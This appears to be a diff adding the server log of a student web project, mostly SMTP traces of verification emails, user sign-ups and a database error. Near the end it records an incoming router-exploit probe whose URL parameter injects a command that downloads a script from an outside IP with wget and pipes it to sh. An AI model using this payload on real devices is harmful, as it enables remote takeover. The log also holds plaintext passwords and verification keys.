+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-VRFY
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-ETRN
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-STARTTLS
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-ENHANCEDSTATUSCODES
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-8BITMIME
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-DSN
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-SMTPUTF8
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250 CHUNKING
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] C: STARTTLS
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 220 2.0.0 Ready to start TLS
+[2024-10-03 05:20:43] INFO  [nPQLU8Gc0c] Connection upgraded with STARTTLS
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] C: EHLO [127.0.0.1]
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-warmup-2.cloud.local
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-PIPELINING
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-SIZE 10240000
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-VRFY
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-ETRN
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-ENHANCEDSTATUSCODES
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-8BITMIME
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-DSN
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250-SMTPUTF8
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250 CHUNKING
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] SMTP handshake finished
+[2024-10-03 05:20:43] INFO  Sending message <9c44cfe4-7e08-8c8f-23ee-359af664e9da@wbill.cse356.compas.cs.stonybrook.edu> to <u31ctc+29gcgdj5wktl4@sharklasers.com>
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] C: MAIL FROM:<no-reply@wbill.cse356.compas.cs.stonybrook.edu>
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250 2.1.0 Ok
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] C: RCPT TO:<u31ctc+29gcgdj5wktl4@sharklasers.com>
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250 2.1.5 Ok
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] C: DATA
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 354 End data with <CR><LF>.<CR><LF>
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] From: no-reply@wbill.cse356.compas.cs.stonybrook.edu
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] To: u31ctc+29gcgdj5wktl4@sharklasers.com
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] Subject: Verify Email for WarmUp
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] Message-ID:
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c]  <9c44cfe4-7e08-8c8f-23ee-359af664e9da@wbill.cse356.compas.cs.stonybrook.edu>
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] Content-Transfer-Encoding: quoted-printable
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] Date: Thu, 03 Oct 2024 05:20:43 +0000
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] MIME-Version: 1.0
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] Content-Type: text/plain; charset=utf-8
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] 
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] Please verify your email by clicking on the following link: =
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] http://localhost/?email=3Du31ctc%2B29gcgdj5wktl4%40sharklasers.=
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] com&key=3Df5d386c780099b381594003ca32c1c732fef5ed694f588de4dcd584c295a8acb
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] .
+[2024-10-03 05:20:43] INFO  [nPQLU8Gc0c] <576 bytes encoded mime message (source size 573 bytes)>
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] S: 250 2.0.0 Ok: queued as B79BEFC933
+[2024-10-03 05:20:43] DEBUG [nPQLU8Gc0c] Closing connection to the server using "end"
+{
+  accepted: [ 'u31ctc+29gcgdj5wktl4@sharklasers.com' ],
+  rejected: [],
+  ehlo: [
+    'PIPELINING',
+    'SIZE 10240000',
+    'VRFY',
+    'ETRN',
+    'ENHANCEDSTATUSCODES',
+    '8BITMIME',
+    'DSN',
+    'SMTPUTF8',
+    'CHUNKING'
+  ],
+  envelopeTime: 32,
+  messageTime: 60,
+  messageSize: 576,
+  response: '250 2.0.0 Ok: queued as B79BEFC933',
+  envelope: {
+    from: 'no-reply@wbill.cse356.compas.cs.stonybrook.edu',
+    to: [ 'u31ctc+29gcgdj5wktl4@sharklasers.com' ]
+  },
+  messageId: '<9c44cfe4-7e08-8c8f-23ee-359af664e9da@wbill.cse356.compas.cs.stonybrook.edu>'
+}
+[2024-10-03 05:20:43] INFO  [nPQLU8Gc0c] Connection closed
+/adduser {
+  username: 'Joana_Hauck79',
+  email: 'jxqgbjsn@sharklasers.com',
+  password: 'password'
+}
+Executing (default): INSERT INTO `Users` (`id`,`username`,`email`,`password`,`key`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3,$4,$5,$6);
+[2024-10-03 05:21:19] DEBUG Sending mail using SMTP/6.9.15[client:6.9.15]
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] Resolved localhost as 127.0.0.1 [cache hit]
+[2024-10-03 05:21:19] INFO  [Y37KxGy50uU] Connection established to 127.0.0.1:25
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 220 warmup-2.cloud.local ESMTP Postfix (Ubuntu)
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] C: EHLO [127.0.0.1]
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-warmup-2.cloud.local
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-PIPELINING
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-SIZE 10240000
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-VRFY
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-ETRN
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-STARTTLS
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-ENHANCEDSTATUSCODES
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-8BITMIME
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-DSN
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-SMTPUTF8
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250 CHUNKING
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] C: STARTTLS
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 220 2.0.0 Ready to start TLS
+[2024-10-03 05:21:19] INFO  [Y37KxGy50uU] Connection upgraded with STARTTLS
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] C: EHLO [127.0.0.1]
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-warmup-2.cloud.local
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-PIPELINING
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-SIZE 10240000
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-VRFY
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-ETRN
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-ENHANCEDSTATUSCODES
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-8BITMIME
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-DSN
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250-SMTPUTF8
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250 CHUNKING
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] SMTP handshake finished
+[2024-10-03 05:21:19] INFO  Sending message <4bc746ee-c7ee-e61e-0e11-a424410f4925@wbill.cse356.compas.cs.stonybrook.edu> to <jxqgbjsn@sharklasers.com>
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] C: MAIL FROM:<no-reply@wbill.cse356.compas.cs.stonybrook.edu>
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250 2.1.0 Ok
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] C: RCPT TO:<jxqgbjsn@sharklasers.com>
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250 2.1.5 Ok
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] C: DATA
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 354 End data with <CR><LF>.<CR><LF>
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] From: no-reply@wbill.cse356.compas.cs.stonybrook.edu
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] To: jxqgbjsn@sharklasers.com
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] Subject: Verify Email for WarmUp
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] Message-ID:
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU]  <4bc746ee-c7ee-e61e-0e11-a424410f4925@wbill.cse356.compas.cs.stonybrook.edu>
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] Content-Transfer-Encoding: quoted-printable
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] Date: Thu, 03 Oct 2024 05:21:19 +0000
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] MIME-Version: 1.0
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] Content-Type: text/plain; charset=utf-8
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] 
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] Please verify your email by clicking on the following link: =
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] http://localhost/?email=3Djxqgbjsn%40sharklasers.com&key=3D2ad7c0afc2af7547=
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] b7f8880ab7db70396e97382e92cbb68cf56ac430015e8893
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] .
+[2024-10-03 05:21:19] INFO  [Y37KxGy50uU] <550 bytes encoded mime message (source size 547 bytes)>
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] S: 250 2.0.0 Ok: queued as D1141FC933
+[2024-10-03 05:21:19] DEBUG [Y37KxGy50uU] Closing connection to the server using "end"
+{
+  accepted: [ 'jxqgbjsn@sharklasers.com' ],
+  rejected: [],
+  ehlo: [
+    'PIPELINING',
+    'SIZE 10240000',
+    'VRFY',
+    'ETRN',
+    'ENHANCEDSTATUSCODES',
+    '8BITMIME',
+    'DSN',
+    'SMTPUTF8',
+    'CHUNKING'
+  ],
+  envelopeTime: 14,
+  messageTime: 68,
+  messageSize: 550,
+  response: '250 2.0.0 Ok: queued as D1141FC933',
+  envelope: {
+    from: 'no-reply@wbill.cse356.compas.cs.stonybrook.edu',
+    to: [ 'jxqgbjsn@sharklasers.com' ]
+  },
+  messageId: '<4bc746ee-c7ee-e61e-0e11-a424410f4925@wbill.cse356.compas.cs.stonybrook.edu>'
+}
+[2024-10-03 05:21:19] INFO  [Y37KxGy50uU] Connection closed
+/verify?email=jxqgbjsn@sharklasers.com&key=2ad7c0afc2af7547b7f8880ab7db70396e97382e92cbb68cf56ac430015e8893 {}
+Executing (default): SELECT `id`, `username`, `email`, `password`, `key`, `createdAt`, `updatedAt` FROM `Users` AS `Users` WHERE `Users`.`email` = 'jxqgbjsn@sharklasers.com';
+Executing (default): UPDATE `Users` SET `key`=$1,`updatedAt`=$2 WHERE `id` = $3
+/ {}
+/adduser {
+  username: 'grader+fGszrkmsw1',
+  password: 'KWalIjPbPhuR5KRJRb3N',
+  email: 'grader+fGszrkmsw1@grading.cse356.compas.cs.stonybrook.edu'
+}
+Executing (default): INSERT INTO `Users` (`id`,`username`,`email`,`password`,`key`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3,$4,$5,$6);
+[2024-10-03 05:22:18] DEBUG Sending mail using SMTP/6.9.15[client:6.9.15]
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] Resolved localhost as 127.0.0.1 [cache hit]
+[2024-10-03 05:22:18] INFO  [3LuLi5icp8] Connection established to 127.0.0.1:25
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 220 warmup-2.cloud.local ESMTP Postfix (Ubuntu)
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] C: EHLO [127.0.0.1]
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-warmup-2.cloud.local
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-PIPELINING
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-SIZE 10240000
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-VRFY
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-ETRN
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-STARTTLS
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-ENHANCEDSTATUSCODES
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-8BITMIME
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-DSN
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-SMTPUTF8
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250 CHUNKING
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] C: STARTTLS
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 220 2.0.0 Ready to start TLS
+[2024-10-03 05:22:18] INFO  [3LuLi5icp8] Connection upgraded with STARTTLS
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] C: EHLO [127.0.0.1]
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-warmup-2.cloud.local
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-PIPELINING
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-SIZE 10240000
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-VRFY
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-ETRN
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-ENHANCEDSTATUSCODES
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-8BITMIME
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-DSN
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250-SMTPUTF8
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250 CHUNKING
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] SMTP handshake finished
+[2024-10-03 05:22:18] INFO  Sending message <15f2cd36-6de9-42a2-0e03-5123d6dbba4a@wbill.cse356.compas.cs.stonybrook.edu> to <grader+fGszrkmsw1@grading.cse356.compas.cs.stonybrook.edu>
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] C: MAIL FROM:<no-reply@wbill.cse356.compas.cs.stonybrook.edu>
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250 2.1.0 Ok
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] C: RCPT TO:<grader+fGszrkmsw1@grading.cse356.compas.cs.stonybrook.edu>
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 250 2.1.5 Ok
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] C: DATA
+[2024-10-03 05:22:18] DEBUG [3LuLi5icp8] S: 354 End data with <CR><LF>.<CR><LF>
+[2024-10-03 05:22:19] DEBUG [3LuLi5icp8] From: no-reply@wbill.cse356.compas.cs.stonybrook.edu
+[2024-10-03 05:22:19] DEBUG [3LuLi5icp8] To: grader+fGszrkmsw1@grading.cse356.compas.cs.stonybrook.edu
+[2024-10-03 05:22:19] DEBUG [3LuLi5icp8] Subject: Verify Email for WarmUp
+[2024-10-03 05:22:19] DEBUG [3LuLi5icp8] Message-ID:
+[2024-10-03 05:22:19] DEBUG [3LuLi5icp8]  <15f2cd36-6de9-42a2-0e03-5123d6dbba4a@wbill.cse356.compas.cs.stonybrook.edu>
+[2024-10-03 05:22:19] DEBUG [3LuLi5icp8] Content-Transfer-Encoding: quoted-printable
+[2024-10-03 05:22:19] DEBUG [3LuLi5icp8] Date: Thu, 03 Oct 2024 05:22:18 +0000
+[2024-10-03 05:22:19] DEBUG [3LuLi5icp8] MIME-Version: 1.0
+[2024-10-03 05:22:19] DEBUG [3LuLi5icp8] Content-Type: text/plain; charset=utf-8
+[2024-10-03 05:22:19] DEBUG [3LuLi5icp8] 
+[2024-10-03 05:22:19] DEBUG [3LuLi5icp8] Please verify your email by clicking on the following link: =
+[2024-10-03 05:22:19] DEBUG [3LuLi5icp8] http://localhost/?email=3Dgrader%2BfGszrkmsw1%40grading.cse356.compas.cs.=
+[2024-10-03 05:22:19] DEBUG [3LuLi5icp8] stonybrook.edu&key=3Df14dcf0ee664760922af83b4359350e00d439a5b0704093c949dec=
+[2024-10-03 05:22:19] DEBUG [3LuLi5icp8] 1d70258b34
+[2024-10-03 05:22:19] DEBUG [3LuLi5icp8] .
+[2024-10-03 05:22:19] INFO  [3LuLi5icp8] <621 bytes encoded mime message (source size 618 bytes)>
+[2024-10-03 05:22:19] DEBUG [3LuLi5icp8] S: 250 2.0.0 Ok: queued as F13BEFC933
+[2024-10-03 05:22:19] DEBUG [3LuLi5icp8] Closing connection to the server using "end"
+{
+  accepted: [ 'grader+fGszrkmsw1@grading.cse356.compas.cs.stonybrook.edu' ],
+  rejected: [],
+  ehlo: [
+    'PIPELINING',
+    'SIZE 10240000',
+    'VRFY',
+    'ETRN',
+    'ENHANCEDSTATUSCODES',
+    '8BITMIME',
+    'DSN',
+    'SMTPUTF8',
+    'CHUNKING'
+  ],
+  envelopeTime: 17,
+  messageTime: 68,
+  messageSize: 621,
+  response: '250 2.0.0 Ok: queued as F13BEFC933',
+  envelope: {
+    from: 'no-reply@wbill.cse356.compas.cs.stonybrook.edu',
+    to: [ 'grader+fGszrkmsw1@grading.cse356.compas.cs.stonybrook.edu' ]
+  },
+  messageId: '<15f2cd36-6de9-42a2-0e03-5123d6dbba4a@wbill.cse356.compas.cs.stonybrook.edu>'
+}
+[2024-10-03 05:22:19] INFO  [3LuLi5icp8] Connection closed
+/adduser {
+  username: 'grader+fGszrkmsw1',
+  password: 'dango-daikazoku',
+  email: 'grader+fGszrkmsw1@grading.cse356.compas.cs.stonybrook.edu'
+}
+Executing (default): INSERT INTO `Users` (`id`,`username`,`email`,`password`,`key`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3,$4,$5,$6);
+Unable to create user Error
+    at Database.<anonymous> (/root/warmup-proj-2/warm-up-2/node_modules/sequelize/lib/dialects/sqlite/query.js:185:27)
+    at /root/warmup-proj-2/warm-up-2/node_modules/sequelize/lib/dialects/sqlite/query.js:183:50
+    at new Promise (<anonymous>)
+    at Query.run (/root/warmup-proj-2/warm-up-2/node_modules/sequelize/lib/dialects/sqlite/query.js:183:12)
+    at /root/warmup-proj-2/warm-up-2/node_modules/sequelize/lib/sequelize.js:315:28
+    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)
+    at async SQLiteQueryInterface.insert (/root/warmup-proj-2/warm-up-2/node_modules/sequelize/lib/dialects/abstract/query-interface.js:308:21)
+    at async model.save (/root/warmup-proj-2/warm-up-2/node_modules/sequelize/lib/model.js:2490:35)
+    at async /root/warmup-proj-2/warm-up-2/server/server.js:80:7 {
+  name: 'SequelizeUniqueConstraintError',
+  errors: [
+    ValidationErrorItem {
+      message: 'username must be unique',
+      type: 'unique violation',
+      path: 'username',
+      value: 'grader+fGszrkmsw1',
+      origin: 'DB',
+      instance: [Users],
+      validatorKey: 'not_unique',
+      validatorName: null,
+      validatorArgs: []
+    }
+  ],
+  parent: [Error: SQLITE_CONSTRAINT: UNIQUE constraint failed: Users.username] {
+    errno: 19,
+    code: 'SQLITE_CONSTRAINT',
+    sql: 'INSERT INTO `Users` (`id`,`username`,`email`,`password`,`key`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3,$4,$5,$6);'
+  },
+  original: [Error: SQLITE_CONSTRAINT: UNIQUE constraint failed: Users.username] {
+    errno: 19,
+    code: 'SQLITE_CONSTRAINT',
+    sql: 'INSERT INTO `Users` (`id`,`username`,`email`,`password`,`key`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3,$4,$5,$6);'
+  },
+  fields: [ 'username' ],
+  sql: 'INSERT INTO `Users` (`id`,`username`,`email`,`password`,`key`,`createdAt`,`updatedAt`) VALUES (NULL,$1,$2,$3,$4,$5,$6);'
+}
+/ {}
+/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.19.99%2Ft%7Csh%3B%60) {}
+ ○ Compiling /_not-found ...
+ ✓ Compiled /_not-found in 5.2s (457 modules)
+ GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.19.99%2Ft%7Csh%3B%60) 404 in 5580ms
+ ✓ Compiled in 519ms (239 modules)
+/ {}
